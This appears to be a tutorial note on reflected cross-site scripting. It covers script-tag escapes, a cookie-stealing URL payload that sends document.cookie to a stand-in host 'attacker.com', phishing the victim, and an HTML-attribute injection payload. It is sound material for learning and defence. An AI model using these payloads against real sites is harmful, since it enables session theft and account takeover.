### *What is reflected XSS?*
This type of XSS attack happens when an attacker injects a malicious script into a web page's URL, which is then reflected back to the user and executed within the user's browser. The injected script is usually part of the request sent to the server (e.g., in the URL parameters) and immediately reflected back in the server's response, which is why it's called "reflected" XSS.
### *Injecting inside JavaScript code*
In these case your input is going to be reflected inside the JavaScript code of a `.js` file or between `<script>...</script>` tags or between HTML events that can execute JavaScript code or between attributes that accepts the `javascript:` protocol.
### *Escaping `<script>` tag*
If your code is inserted within `<script> [...] var input = 'reflected data' [...] </script>` you could easily escape closing the `**<script>**` tag:
`</script><img src=1 onerror=alert(document.domain)>`

> Note that in this example we haven't closed the single quote, but that's not necessary as the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.
### *Stealing user's cookie with reflected XSS*
**Identify the Vulnerability**
First, an attacker needs to find a point in the application where user input is reflected back without proper sanitization. Let's say there's a vulnerable search function at `https://insecure-website.com/search?term=gift`
that reflects the `term` parameter back to the user without escaping.
    
**Craft the Malicious URL**
The attacker can create a malicious URL that includes a script to steal the user's cookie. Here's an example:
```
https://insecure-website.com/search?term=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie;</script>
```

In this example, the JavaScript code redirects the user to the attacker's website, appending the user's cookies as a query parameter.
    
**Lure the Victim**
The attacker must then get the victim to visit the crafted URL. This could be done through a phishing email, a link on a forum, or other social engineering techniques.
    
**Steal the Cookie**
If the victim clicks on the malicious link, the script executes in their browser, sending the cookie to the attacker's website.
    
**Attacker's Server-Side Code**
On the attacker's server, they could create a script to collect and store the cookies. 

**Use the Stolen Cookie**
With the victim's cookie, the attacker might impersonate the victim on the original site, gaining access to their account or performing actions on their behalf.

> Modern browsers implement security measures such as the HttpOnly flag for cookies, making them inaccessible via JavaScript. This would mitigate the risk of this specific attack, but it's not a substitute for proper input validation and escaping within the application itself.
### *XSS is being reflected in HTML attribute*
There could an XSS payload being reflected within an HTML attribute, in this example the payload was being reflected in **value** attribute in the search input. 

The request being made
`GET /?search=fghfgh\"+onmouseover="alert(1)`
	
Is being reflected inside the input tag
`<input type=text placeholder='Search the blog...' name=search value="fghfgh\" onmouseover="alert(1)">`
### *Resources*
- https://portswigger.net/support/exploiting-xss-injecting-into-tag-attributes